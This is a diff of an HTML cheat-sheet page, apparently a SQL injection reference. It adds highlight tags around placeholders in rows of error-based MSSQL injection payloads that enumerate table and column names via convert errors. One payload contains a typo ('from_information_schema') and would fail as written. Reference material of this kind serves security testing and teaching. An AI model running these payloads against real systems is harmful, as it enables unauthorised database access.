@@ -392,7 +392,7 @@ layout: default
                         </tr>
                         <tr>
                             <td>Enumerate table 3 name (Generate error: failed when converting the nvarchar value '&lt;table_3&gt;' to data)</td>
-                            <td>1 and 1=convert(int,(select top 1 table_name from_information_schema.tables where table_name not in (&#039;&lt;table_1&gt;&#039;,&#039;&lt;table_2&gt;&#039;)))--</td>
+                            <td>1 and 1=convert(int,(select top 1 table_name from_information_schema.tables where table_name not in (&#039;<mark>&lt;table_1&gt;</mark>&#039;,&#039;<mark>&lt;table_2&gt;</mark>&#039;)))--</td>
                         </tr>
                     </table>
                 </td>
@@ -407,7 +407,7 @@ layout: default
                         </tr>
                         <tr>
                             <td>Enumerate column 2 for table_1 (Generate error: failed when converting the nvarchar value '&lt;column_2&gt;' to data)</td>
-                            <td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='&lt;table 1&gt;' and column_name not in ('&lt;Column 1&gt;')))--</td>
+                            <td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='<mark>&lt;table 1&gt;</mark>' and column_name not in ('<mark>&lt;Column 1&gt;</mark>')))--</td>
                         </tr>
                         <tr>
                             <td>Enumerate column 3 for table_1 (Generate error: failed when converting the nvarchar value '&lt;column_3&gt;' to data)</td>
